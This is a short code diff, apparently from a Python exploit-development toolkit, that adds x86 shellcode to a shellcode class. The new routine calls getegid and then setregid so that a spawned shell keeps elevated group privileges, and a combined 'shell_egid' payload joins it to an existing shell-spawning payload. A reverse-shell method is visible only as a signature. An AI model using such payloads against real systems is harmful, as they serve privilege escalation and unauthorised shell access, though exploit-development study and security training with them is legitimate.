@@ -229,7 +229,21 @@ class x86_shellcode:
         mov al, 0x46
         int 0x80
         """)
+    setegid = x86.assemble("""
+        ; getegid
+        xor eax, eax
+        mov al, 50
+        int 0x80
+
+        ; setregid
+        mov ebx, eax
+        mov ecx, eax
+        xor eax, eax
+        mov al, 71
+        int 0x80
+        """)
     shell_euid = seteuid + shell
+    shell_egid = setegid + shell
 
     @staticmethod
     def shell_reverse(addr, port):
